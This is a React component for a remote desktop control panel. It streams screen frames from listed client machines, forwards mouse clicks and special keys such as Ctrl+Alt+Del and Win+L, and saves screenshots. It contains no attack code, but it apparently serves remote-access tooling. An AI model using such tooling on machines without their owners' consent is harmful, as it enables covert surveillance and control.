import React, { useState, useEffect, useRef } from "react";
import { useClients } from "@/context/clients-context";
import { Client } from "@/types";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { useToast } from "@/hooks/use-toast";

interface StreamingControlProps {
  clients: Client[];
  defaultClientId?: string;
}

interface StreamSettings {
  quality: number;
  fps: number;
}

const qualityOptions = [
  { value: "10", label: "Low (10%)" },
  { value: "30", label: "Medium (30%)" },
  { value: "50", label: "High (50%)" },
  { value: "80", label: "Ultra (80%)" },
];

const fpsOptions = [
  { value: "1", label: "1 FPS" },
  { value: "2", label: "2 FPS" },
  { value: "5", label: "5 FPS" },
  { value: "10", label: "10 FPS" },
  { value: "15", label: "15 FPS" },
];

const StreamingControl: React.FC<StreamingControlProps> = ({ clients, defaultClientId }) => {
  const { controlStream, streamFrame, sendClientAction } = useClients();
  const { toast } = useToast();
  const [selectedClientId, setSelectedClientId] = useState<string>(defaultClientId || "");
  const [settings, setSettings] = useState<StreamSettings>({ quality: 30, fps: 5 });
  const [isStreaming, setIsStreaming] = useState(false);
  const [currentFrame, setCurrentFrame] = useState<string | null>(null);
  const [mouseControl, setMouseControl] = useState(false);
  const [keyboardControl, setKeyboardControl] = useState(false);
  const canvasRef = useRef<HTMLDivElement>(null);

  // Update frame from context
  useEffect(() => {
    if (streamFrame && streamFrame.clientId === selectedClientId) {
      setCurrentFrame(streamFrame.frame);
    }
  }, [streamFrame, selectedClientId]);

  // Handle stream start/stop
  const handleStreamToggle = async () => {
    if (!selectedClientId) {
      toast({
        title: "No client selected",
        description: "Please select a client to stream from",
        variant: "destructive",
      });
      return;
    }

    if (!isStreaming) {
      // Start streaming
      const success = await controlStream(selectedClientId, "start", {
        quality: settings.quality,
        fps: settings.fps,
      });

      if (success) {
        setIsStreaming(true);
        toast({
          title: "Stream Started",
          description: `Streaming from client ${selectedClientId} at ${settings.fps} FPS`,
        });
      } else {
        toast({
          title: "Stream Failed",
          description: "Failed to start stream from client",
          variant: "destructive",
        });
      }
    } else {
      // Stop streaming
      const success = await controlStream(selectedClientId, "stop");
      
      if (success) {
        setIsStreaming(false);
        setCurrentFrame(null);
        toast({
          title: "Stream Stopped",
          description: "Stream from client has been stopped",
        });
      } else {
        toast({
          title: "Stop Failed",
          description: "Failed to stop client stream",
          variant: "destructive",
        });
      }
    }
  };

  // Handle mouse click on stream
  const handleCanvasClick = async (e: React.MouseEvent<HTMLDivElement>) => {
    if (!mouseControl || !canvasRef.current || !selectedClientId) return;

    const rect = canvasRef.current.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;

    // Calculate percentages of click position relative to image size
    const width = rect.width;
    const height = rect.height;
    const xPercent = (x / width) * 100;
    const yPercent = (y / height) * 100;

    await sendClientAction(selectedClientId, "mouseClick", {
      x: xPercent,
      y: yPercent,
      button: 0, // Left click
    });

    // Visual feedback for click
    const feedbackEl = document.createElement("div");
    feedbackEl.style.position = "absolute";
    feedbackEl.style.left = `${x - 5}px`;
    feedbackEl.style.top = `${y - 5}px`;
    feedbackEl.style.width = "10px";
    feedbackEl.style.height = "10px";
    feedbackEl.style.borderRadius = "50%";
    feedbackEl.style.backgroundColor = "rgba(37, 99, 235, 0.5)";
    feedbackEl.style.pointerEvents = "none";
    feedbackEl.style.zIndex = "100";
    feedbackEl.style.animation = "pulse 1s ease-out";
    
    canvasRef.current.appendChild(feedbackEl);
    
    setTimeout(() => {
      if (canvasRef.current?.contains(feedbackEl)) {
        canvasRef.current.removeChild(feedbackEl);
      }
    }, 1000);
  };

  // Handle special key presses
  const handleSpecialKey = async (key: string) => {
    if (!keyboardControl || !selectedClientId) return;
    
    await sendClientAction(selectedClientId, "specialKey", { key });
    
    toast({
      title: "Key Sent",
      description: `Sent special key: ${key}`,
    });
  };

  return (
    <div>
      <div className="mb-6">
        <h1 className="text-xl font-semibold text-white mb-4">Remote Streaming Control</h1>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          {/* Client Selection */}
          <div className="md:col-span-1">
            <Label className="block text-sm font-medium text-gray-400 mb-2">Select Client</Label>
            <Select
              value={selectedClientId}
              onValueChange={setSelectedClientId}
              disabled={isStreaming}
            >
              <SelectTrigger className="w-full bg-dark-lighter border border-dark-lightest rounded-md focus:ring-2 focus:ring-primary focus:border-transparent">
                <SelectValue placeholder="Choose a client..." />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="">Choose a client...</SelectItem>
                {clients.map((client) => (
                  <SelectItem key={client.clientId} value={client.clientId}>
                    {client.hostname} ({client.clientId})
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          
          {/* Stream Quality */}
          <div className="md:col-span-1">
            <Label className="block text-sm font-medium text-gray-400 mb-2">Quality</Label>
            <Select
              value={settings.quality.toString()}
              onValueChange={(value) => setSettings({ ...settings, quality: parseInt(value) })}
              disabled={isStreaming}
            >
              <SelectTrigger className="w-full bg-dark-lighter border border-dark-lightest rounded-md focus:ring-2 focus:ring-primary focus:border-transparent">
                <SelectValue placeholder="Select quality" />
              </SelectTrigger>
              <SelectContent>
                {qualityOptions.map((option) => (
                  <SelectItem key={option.value} value={option.value}>
                    {option.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          
          {/* Frame Rate */}
          <div className="md:col-span-1">
            <Label className="block text-sm font-medium text-gray-400 mb-2">Frame Rate</Label>
            <Select
              value={settings.fps.toString()}
              onValueChange={(value) => setSettings({ ...settings, fps: parseInt(value) })}
              disabled={isStreaming}
            >
              <SelectTrigger className="w-full bg-dark-lighter border border-dark-lightest rounded-md focus:ring-2 focus:ring-primary focus:border-transparent">
                <SelectValue placeholder="Select FPS" />
              </SelectTrigger>
              <SelectContent>
                {fpsOptions.map((option) => (
                  <SelectItem key={option.value} value={option.value}>
                    {option.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          
          {/* Controls */}
          <div className="md:col-span-1">
            <Label className="block text-sm font-medium text-gray-400 mb-2">Controls</Label>
            <div className="flex space-x-2">
              <Button
                variant={isStreaming ? "destructive" : "default"}
                className="flex-1 text-white font-medium py-2 px-4 rounded-md transition duration-200"
                onClick={handleStreamToggle}
                disabled={!selectedClientId}
              >
                {isStreaming ? (
                  <>
                    <i className="fas fa-stop mr-1"></i> Stop
                  </>
                ) : (
                  <>
                    <i className="fas fa-play mr-1"></i> Start
                  </>
                )}
              </Button>
              
              <Button
                variant="outline"
                className="flex-1 bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200"
                onClick={() => {
                  setCurrentFrame(null);
                  toast({
                    title: "Stream Reset",
                    description: "The stream display has been reset",
                  });
                }}
                disabled={!isStreaming}
              >
                <i className="fas fa-sync-alt mr-1"></i> Reset
              </Button>
            </div>
          </div>
        </div>
      </div>
      
      {/* Stream Display */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Main Stream Viewer */}
        <div className="lg:col-span-2 bg-dark-lighter rounded-lg shadow-md">
          <div className="px-6 py-4 border-b border-dark-lightest flex justify-between items-center">
            <h2 className="text-lg font-medium text-white">
              Live Stream: <span className="font-mono text-sm text-gray-400">
                {selectedClientId ? (
                  isStreaming ? selectedClientId : "Not active"
                ) : "Not active"}
              </span>
            </h2>
            {isStreaming && (
              <div className="flex items-center space-x-4">
                <div className="text-xs bg-dark px-3 py-1 rounded-full">
                  <span className="text-warning">{settings.fps} FPS</span>
                </div>
                <div className="text-xs bg-dark px-3 py-1 rounded-full">
                  <span className="text-success">{settings.quality}% Quality</span>
                </div>
              </div>
            )}
          </div>
          <div className="p-6">
            <div 
              ref={canvasRef}
              className="relative rounded-md overflow-hidden bg-dark h-96 flex items-center justify-center"
              onClick={handleCanvasClick}
              style={{ cursor: mouseControl ? 'crosshair' : 'default' }}
            >
              {currentFrame ? (
                <img
                  src={`data:image/jpeg;base64,${currentFrame}`}
                  alt="Live stream from client"
                  className="max-w-full max-h-full"
                />
              ) : (
                <div className="text-gray-500 flex flex-col items-center">
                  <i className="fas fa-desktop text-4xl mb-2"></i>
                  <p>No active stream</p>
                  <p className="text-xs mt-1">Select a client and start streaming</p>
                </div>
              )}
              <div className="absolute bottom-4 right-4 flex space-x-2">
                <Button
                  variant="outline"
                  size="sm"
                  className={`bg-dark bg-opacity-70 hover:bg-opacity-100 text-white p-2 rounded-full transition duration-200 ${!isStreaming ? 'opacity-50' : ''}`}
                  disabled={!isStreaming}
                  onClick={() => setMouseControl(!mouseControl)}
                >
                  <i className={`fas fa-mouse-pointer ${mouseControl ? 'text-primary' : ''}`}></i>
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  className={`bg-dark bg-opacity-70 hover:bg-opacity-100 text-white p-2 rounded-full transition duration-200 ${!isStreaming ? 'opacity-50' : ''}`}
                  disabled={!isStreaming}
                  onClick={() => setKeyboardControl(!keyboardControl)}
                >
                  <i className={`fas fa-keyboard ${keyboardControl ? 'text-primary' : ''}`}></i>
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  className={`bg-dark bg-opacity-70 hover:bg-opacity-100 text-white p-2 rounded-full transition duration-200 ${!currentFrame ? 'opacity-50' : ''}`}
                  disabled={!currentFrame}
                  onClick={() => {
                    if (currentFrame) {
                      const link = document.createElement('a');
                      link.href = `data:image/jpeg;base64,${currentFrame}`;
                      link.download = `stream-${selectedClientId}-${new Date().toISOString()}.jpg`;
                      link.click();
                      
                      toast({
                        title: "Screenshot Saved",
                        description: "Screenshot has been saved from the stream",
                      });
                    }
                  }}
                >
                  <i className="fas fa-camera"></i>
                </Button>
              </div>
            </div>
          </div>
        </div>
        
        {/* Remote Control Options */}
        <div className="bg-dark-lighter rounded-lg shadow-md">
          <div className="px-6 py-4 border-b border-dark-lightest">
            <h2 className="text-lg font-medium text-white">Remote Control</h2>
          </div>
          <div className="p-6">
            <div className="space-y-6">
              {/* Mouse Control */}
              <div>
                <h3 className="text-sm font-medium text-gray-400 mb-2">Mouse Control</h3>
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Enable Mouse Control</span>
                    <Switch
                      checked={mouseControl}
                      onCheckedChange={setMouseControl}
                      disabled={!isStreaming}
                    />
                  </div>
                  <div className="flex items-center justify-between opacity-50">
                    <span className="text-sm">Track Click Events</span>
                    <Switch
                      checked={true}
                      disabled={true}
                    />
                  </div>
                </div>
              </div>
              
              {/* Keyboard Control */}
              <div>
                <h3 className="text-sm font-medium text-gray-400 mb-2">Keyboard Control</h3>
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Enable Keyboard Input</span>
                    <Switch
                      checked={keyboardControl}
                      onCheckedChange={setKeyboardControl}
                      disabled={!isStreaming}
                    />
                  </div>
                  <div className="flex items-center justify-between opacity-50">
                    <span className="text-sm">Send Special Keys</span>
                    <Switch
                      checked={true}
                      disabled={true}
                    />
                  </div>
                </div>
              </div>
              
              {/* Special Commands */}
              <div>
                <h3 className="text-sm font-medium text-gray-400 mb-2">Special Commands</h3>
                <div className="grid grid-cols-2 gap-2">
                  <Button
                    variant="outline"
                    size="sm"
                    className={`bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center justify-center text-sm ${!keyboardControl || !isStreaming ? 'opacity-50' : ''}`}
                    disabled={!keyboardControl || !isStreaming}
                    onClick={() => handleSpecialKey('alt+tab')}
                  >
                    <i className="fas fa-window-restore mr-1"></i> Alt+Tab
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    className={`bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center justify-center text-sm ${!keyboardControl || !isStreaming ? 'opacity-50' : ''}`}
                    disabled={!keyboardControl || !isStreaming}
                    onClick={() => handleSpecialKey('ctrl+alt+del')}
                  >
                    <i className="fas fa-tasks mr-1"></i> Ctrl+Alt+Del
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    className={`bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center justify-center text-sm ${!keyboardControl || !isStreaming ? 'opacity-50' : ''}`}
                    disabled={!keyboardControl || !isStreaming}
                    onClick={() => handleSpecialKey('win+d')}
                  >
                    <i className="fas fa-desktop mr-1"></i> Win+D
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    className={`bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center justify-center text-sm ${!keyboardControl || !isStreaming ? 'opacity-50' : ''}`}
                    disabled={!keyboardControl || !isStreaming}
                    onClick={() => handleSpecialKey('win+l')}
                  >
                    <i className="fas fa-lock mr-1"></i> Win+L
                  </Button>
                </div>
              </div>
              
              {/* Recording Options */}
              <div>
                <h3 className="text-sm font-medium text-gray-400 mb-2">Recording Options</h3>
                <div className="space-y-2">
                  <Button
                    variant="outline"
                    className={`w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center text-sm ${!isStreaming ? 'opacity-50' : ''}`}
                    disabled={!isStreaming}
                    onClick={() => {
                      toast({
                        title: "Recording",
                        description: "Recording feature not implemented yet"
                      });
                    }}
                  >
                    <i className="fas fa-record-vinyl mr-2 text-danger"></i> Start Recording Session
                  </Button>
                  <Button
                    variant="outline"
                    className={`w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center text-sm ${!currentFrame ? 'opacity-50' : ''}`}
                    disabled={!currentFrame}
                    onClick={() => {
                      if (currentFrame) {
                        const link = document.createElement('a');
                        link.href = `data:image/jpeg;base64,${currentFrame}`;
                        link.download = `screenshot-${selectedClientId}-${new Date().toISOString()}.jpg`;
                        link.click();
                        
                        toast({
                          title: "Screenshot Saved",
                          description: "Screenshot has been saved from the stream",
                        });
                      }
                    }}
                  >
                    <i className="fas fa-camera mr-2"></i> Take Screenshot
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default StreamingControl;
